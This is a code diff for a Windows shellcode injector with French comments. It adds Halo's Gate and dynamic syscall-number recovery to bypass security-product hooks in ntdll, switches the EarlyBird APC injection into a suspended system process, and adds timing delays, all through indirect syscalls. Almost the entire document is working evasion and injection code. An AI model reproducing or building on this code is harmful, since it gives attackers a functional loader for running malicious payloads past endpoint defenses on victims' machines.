@@ -87,12 +87,90 @@ BOOL isWow64(HANDLE hProcess) {
     return bIsWow64;
 }
 
+LPVOID Halo_gate(HMODULE hNtdll){
+    LPVOID stub = nullptr;
+    BYTE* textBase = nullptr;
+    DWORD textSize = 0;
+
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
+
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+        if (memcmp(sec->Name, ".text", 5) == 0) {
+            textBase = (BYTE*)hNtdll + sec->VirtualAddress;
+            textSize = sec->Misc.VirtualSize;
+            break;
+        }
+    }
+
+    BYTE* looker = textBase;
+    for (int _ = 0; _ < textSize; _++) {
+        looker++;
+        if (looker[0] == 0x4C && looker[1] == 0x8B && looker[2] == 0xD1 && looker[3] == 0xB8) {
+            //stub normal => on trouve "syscall" (0x0F 0x05)
+            if (looker[0x12] == 0x0F && looker[0x13] == 0x05) {
+                stub = looker; // direct vers le syscall
+                printf("\t[*] Found syscall with Halo's gate [0F 05] !\n");
+                break;
+            }
+        }
+    }
+
+    return stub;
+}
+
+DWORD dynamicSSN_retreive(BYTE* NtFunctionAddr) {
+    DWORD SSN = 0;
+    int lookerField = 0x500;   // fenêtre de scan en arrière (bytes)
+    int steps = 0;
+
+    if (!NtFunctionAddr) return 0;
+
+    // Sécuriser les bornes de lecture (resterdans la même région mémoire)
+    MEMORY_BASIC_INFORMATION mbi{};
+    if (!VirtualQuery(NtFunctionAddr, &mbi, sizeof(mbi))) return 0;
+    BYTE* regionBase = (BYTE*)mbi.BaseAddress;
+    BYTE* regionEnd  = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
+
+    BYTE* lowerBound = NtFunctionAddr - lookerField;
+    if (lowerBound < regionBase) lowerBound = regionBase;
+
+    BYTE* looker = NtFunctionAddr;
+
+    while (looker >= lowerBound) {
+        // On s'assure qu'on peut lire au moins les 8 bytes (signature + imm32)
+        // (Qu'on reste bien dans la meme région)
+        if (looker + 7 >= regionEnd) {
+            looker--; 
+            continue;
+        }
+
+        // stub clean: 4C 8B D1 B8 xx xx xx xx (mov r10, rcx; mov eax, imm32)
+        if (looker[0] == 0x4C && looker[1] == 0x8B && looker[2] == 0xD1 && looker[3] == 0xB8) {
+            SSN = (*(DWORD*)(looker + 4)) + (DWORD)steps;
+            printf("\t[*] yaay found SSN : 0x%x w/ %d steps\n", SSN, steps);
+            break;
+        }
+
+        // stub hooké "jmp rel32": 4C 8B D1 E9 ....
+        if (looker[0] == 0x4C && looker[1] == 0x8B && looker[2] == 0xD1 && looker[3] == 0xE9) {
+            steps++;
+        }
+
+        looker--;
+    }
+
+    return SSN;
+}
+
 DWORD getInDirectSyscallStub(HMODULE hNTDLL, const char* NtFunctionName, PSYSCALL_STUB sstub){
     DWORD SSN = 0;
     LPVOID stub = NULL;
     BYTE* NtFunctionAddr = (BYTE*)MyGetProcAddress(hNTDLL, NtFunctionName);
 
     if (!NtFunctionAddr) return SSN;
+    //Case si on a le SSN mais pas le syscall
     if (NtFunctionAddr[0] == 0x4C && NtFunctionAddr[1] == 0x8B && NtFunctionAddr[2] == 0xD1 && NtFunctionAddr[3] == 0xB8) {
         printf("[+] Function %s @ 0x%p\n", NtFunctionName, NtFunctionAddr);
         SSN = *(DWORD*)((BYTE*)NtFunctionAddr + 4);
@@ -104,21 +182,16 @@ DWORD getInDirectSyscallStub(HMODULE hNTDLL, const char* NtFunctionName, PSYSCAL
         } else {
             printf("[*] %s may be hooked by a security!\n", NtFunctionName);
             printf("[*] Let's do a magic trick!\n");
-            BYTE* looker = NtFunctionAddr;
-            for (int _ = 0; _ < 0x500; _++) {
-                looker++;
-                if (looker[0] == 0x4C && looker[1] == 0x8B && looker[2] == 0xD1 && looker[3] == 0xB8) {
-                    //stub normal => on trouve "syscall" (0x0F 0x05)
-                    if (looker[0x12] == 0x0F && looker[0x13] == 0x05) {
-                        stub = looker; // direct vers le syscall
-                        printf("\t[*] Found unhooked syscall [0F 05] !\n");
-                        break;
-                    }
-                }
-            } 
+            stub = Halo_gate(hNTDLL);
+             
         }
+    //case si on a pas de SSN (on aura pas de syscall non plus lol)
     } else { 
-        printf("[-] Unexpected stub format!\n");
+        printf("[-] Unexpected stub format for %s!\n", NtFunctionName);
+        printf("[-] SSN not found!\n");
+        printf("[-] Trying dynamic SSN retrival\n");
+        SSN = dynamicSSN_retreive(NtFunctionAddr);
+        stub = Halo_gate(hNTDLL);
         return SSN;
     }
 
@@ -137,7 +210,7 @@ void CreateEarlyBird(char *lpPath, PHANDLE hProcess, PHANDLE hThread, PDWORD dwP
     memset(&Si, 0, sizeof(STARTUPINFO));
     memset(&Pi, 0, sizeof(PROCESS_INFORMATION));
 
-    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {
+    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi)) {
 		printf("[-] CreateProcessA Failed  : %d \n", GetLastError());
 		return;
 	}
@@ -162,7 +235,7 @@ int injectProc(){
     DWORD dwProcessId;
 
     sprintf(lpPath, "C:\\windows\\System32\\%s", lpProcessName);
-    printf("\n[+] Starting EarlyBird with DEBUG_PROCESS flag : \"%s\" ... \n", lpPath);
+    printf("\n[+] Starting EarlyBird with CREATE_SUSPENDED flag : \"%s\" ... \n", lpPath);
 
     CreateEarlyBird(lpPath, &hProcess, &hThread, &dwProcessId);
     printf("[*] hProcess %p | hThread %p | dwProcessId %d\n", hProcess, hThread, dwProcessId);
@@ -188,7 +261,7 @@ int injectProc(){
         printf("[-] NtAllocateVirtualMemory Failed !\n");
         return 1;
     }
-    
+    Sleep(534);
     //LPVOID memPoolPtr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode_64), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
     printf("[+] Mem page allocated at: 0x%p\n", memPoolPtr);
 
@@ -216,20 +289,18 @@ int injectProc(){
     //    return 1;
     //}
     VirtualProtectEx(hProcess, memPoolPtr, scSize, PAGE_EXECUTE_READ, &oldProt);
+    Sleep(219);
 
     SYSCALL_STUB apcStub = { 0 };
     getInDirectSyscallStub(hNtdll, (LPCSTR)_NtQueueApcThread, &apcStub);
     g_SSN_NtQueueApcThread = apcStub.SyscallId;
     g_SYSADDR_NtQueueApcThread = apcStub.SyscallFunc;
 
-    if (stubNtQueueApcThread(hThread, (PPS_APC_ROUTINE)memPoolPtr, 0, 0, 0)) {
+    if (stubNtQueueApcThread(hThread, memPoolPtr, 0, 0, 0)) {
         printf("[-] NtQueueApcThread Failed !\n");
         return 1;
     }
     printf("[+] APC Queued.\n");
-
-    DebugActiveProcessStop(dwProcessId);
-    printf("[+] EarlyBird Debug Stopped.\n");
     
     SYSCALL_STUB rtStub = { 0 };
     getInDirectSyscallStub(hNtdll, (LPCSTR)_NtResumeThread, &rtStub);
@@ -247,7 +318,7 @@ int injectProc(){
     g_SSN_NtWaitForSingleObject = wfsoStub.SyscallId;
     g_SYSADDR_NtWaitForSingleObject = wfsoStub.SyscallFunc;
     //WaitForSingleObject(hThread, INFINITE);
-    if (stubNtWaitForSingleObject(hThread, TRUE, NULL)) {
+    if (stubNtWaitForSingleObject(hThread, FALSE, NULL)) {
         printf("[-] NtQueueApcThread Failed !\n");
         return 1;
     }
